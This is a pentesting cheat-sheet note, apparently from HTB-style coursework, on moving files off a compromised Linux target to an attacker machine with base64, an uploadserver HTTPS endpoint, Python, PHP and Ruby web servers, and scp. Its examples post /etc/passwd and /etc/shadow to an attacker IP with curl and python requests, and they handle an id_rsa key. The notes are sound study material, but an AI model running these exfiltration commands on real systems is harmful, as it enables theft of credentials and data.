---
id: Upload
aliases: []
tags:
  - Pentest/File-Transfer/Linux/Upload
---

# Upload

Upload (*acquire*) files from the target machine
(*e.g., for password cracking, analysis, exfiltration, etc.*)

> [!tip]
>
> The methods used for [[Download|download]] are also available


```mermaid
flowchart RL
    Target-->Attacker
```
___

<!-- Base64 {{{-->
## Base64

In case it is not possible to transfer files
(*e.g., the remote host has firewall protection*)

<!-- Info - Base64 {{{-->
> [!info]- Base64
>
> [Base64](https://en.wikipedia.org/wiki/Base64)
> is a [binary-to-text encoding](https://en.wikipedia.org/wiki/Binary-to-text_encoding)
> that uses 64 printable characters to represent each 6-bit segment
> of a sequence of byte values
>
> Binary-to-text encodings enables transmitting binary data
> on a communication channel that only supports text
<!-- }}} -->

1. **TARGET**: [md5sum](https://en.wikipedia.org/wiki/Md5sum) —
   Run on the file for reference

```sh
md5sum <file>
```

<!-- Example {{{-->
> [!example]-
>
> ```
> md5sum id_rsa
> ```
> ```sh
> 321de1d7e7c3735838890a72c9ae7d1d id_rsa
> ```
<!-- }}} -->

2. **TARGET**: Encode the binary file to Base64

Dump to terminal

```sh
base64 -w 0 <file>; echo
```

Dump to file

```sh
base64 -w 0 <file> > file.b64
```

Dump to clipboard

```sh
base64 -w 0 <file> | xclip -selection clipboard
```

<!-- Info {{{-->
> [!info]-
>
> - `-w`, `--wrap=COLS`: Wrap encoded lines after COLS character (*default 76*)
>   (*0 to disable line wrapping*)
<!-- }}} -->

3. **ATTACKER**: Decode Base64 string

Decode from terminal

```sh
echo <base64_string> | base64 -d > <file>
```

Decode from "interactive mode"

```sh
cat | base64 -d > outputfile
```

- Paste the base64 blob
- Press `CTRL` + `D`

Decode from heredoc

```sh
base64 -d > outputfile << 'EOF'
PASTE_BASE64_HERE
EOF
```

- Paste the base64 blob
- Press `ENTER`
- Type `EOF` and press `ENTER`

4. **ATTACKER**: [md5sum](https://en.wikipedia.org/wiki/Md5sum)
   — Validate the hash

```sh
md5sum <file>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> md5sum id_rsa
> ```
> ```sh
> 321de1d7e7c3735838890a72c9ae7d1d id_rsa
> ```
<!-- }}} -->

___
<!-- }}} -->

<!-- Web Upload {{{-->
## Web Upload

1. **ATTACKER**: Install [uploadserver](https://github.com/Densaugeo/uploadserver)
   — Python's [http.server](https://docs.python.org/3/library/http.server.html)
   extended to include a file upload page

[[pipx]]

```sh
pipx install uploadserver
```

[[Virtual Environment]]

```sh
pip install uploadserver
```

2. **ATTACKER**: Create a Self-Signed Certificate


```sh
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

<!-- Warning {{{-->
> [!warning]
>
> The self-signed certificate file (*`server.pem`*)
> should not be placed in an accessible location
>
> > [!tip]
> >
> > It is recommend creating a new directory
> > outside the server's served files
> > to host the file for the web server
> >
> > ```sh
> > mkdir certificate && mv server.pem certificate/
> > ```
<!-- }}} -->

3. **ATTACKER**: Start the web server

Create a directory for the server (*optional*)

```sh
mkdir https && cd https
```

[[pipx]]

```sh
pipx run uploadserver 443 --server-certificate ../certificate/server.pem
```

[[Virtual Environment]]

```sh
python3 -m uploadserver 443 --server-certificate ../certificate/server.pem
```

4. **TARGET**: Upload multiple files

[Python](https://www.python.org/downloads/)

```sh
python3 -c 'import requests;requests.post("<target>",files={"files":open("<file>","rb")})'
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
> ```
<!-- }}} -->

[[cURL]]

```sh
curl -X POST https://<target>/upload -F 'files=@<file>' -F 'files=@<file>' --insecure
```

<!-- Info {{{-->
> [!info]-
>
> The `/upload` path is a default URL endpoint
> provided by the Python `uploadserver` package for file uploads.
>
> - `--insecure`: Trust self-signed certificate
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> ```sh
> curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
> ```
<!-- }}} -->

<!-- Alternative Methods {{{-->
### Alternative Methods

Host alternative web servers on the target machine

[Python3](https://www.python.org/)
— Create a web server

```sh
python3 -m http.server
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> python3 -m http.server
> ```
> ```sh
> Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
> ```
<!-- }}} -->

[Python 2.7](https://www.python.org/download/releases/2.7/)
— Create a web server

```sh
python2.7 -m SimpleHTTPServer
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> python2.7 -m SimpleHTTPServer
> ```
> ```sh
> Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
> ```
<!-- }}} -->

[PHP](https://www.php.net/)
— Create a web server

```sh
php -S 0.0.0.0:8000
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> php -S 0.0.0.0:8000
> ```
> ```sh
> [Fri May 20 08:16:47 2022] PHP 7.4.28 Development Server (http://0.0.0.0:8000) started
> ```
<!-- }}} -->

[Ruby](https://www.ruby-lang.org/en/)
— Create a web server

```sh
ruby -run -ehttpd . -p8000
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> ruby -run -ehttpd . -p8000
> ```
> ```sh
> [2022-05-23 09:35:46] INFO  WEBrick 1.6.1
> [2022-05-23 09:35:46] INFO  ruby 2.7.4 (2021-07-07) [x86_64-linux-gnu]
> [2022-05-23 09:35:46] INFO  WEBrick::HTTPServer#start: pid=1705 port=8000
> ```
<!-- }}} -->

Download a file from the target onto the attacker machine

```sh
wget <target>:8000/<file>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> wget 192.168.49.128:8000/filetotransfer.txt
> ```
> ```sh
> --2022-05-20 08:13:05--  http://192.168.49.128:8000/filetotransfer.txt
> Connecting to 192.168.49.128:8000... connected.
> HTTP request sent, awaiting response... 200 OK
> Length: 0 [text/plain]
> Saving to: 'filetotransfer.txt'
>
> filetotransfer.txt                       [ <=>                                                                  ]       0  --.-KB/s    in 0s      
>
> 2022-05-20 08:13:05 (0.00 B/s) - ‘filetotransfer.txt’ saved [0/0]
> ```
<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->

<!-- SSH {{{-->
## SSH

The [[SSH/General|SSH]] implementation comes with an
[SCP](https://en.wikipedia.org/wiki/Secure_copy_protocol)
utility for remote file transfer

It is possible to transfer files using `scp` once

- SSH connection is established
- User credentials are known

<!-- SCP Transfer {{{-->
### SCP Transfer

Transfer a file to the remote (*attacker*) machine

```sh
scp <file> <user>@<target>:/tmp/<file>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> scp /etc/passwd user@10.129.86.90:/home/htb-student/
>
> user@10.129.86.90's password:
> passwd
> ```
<!-- }}} -->

> [!tip]
>
> Create a temporary user account for file transfers
> to avoid using primary credentials or keys on a remote computer

<!-- }}} -->

___
<!-- }}} -->
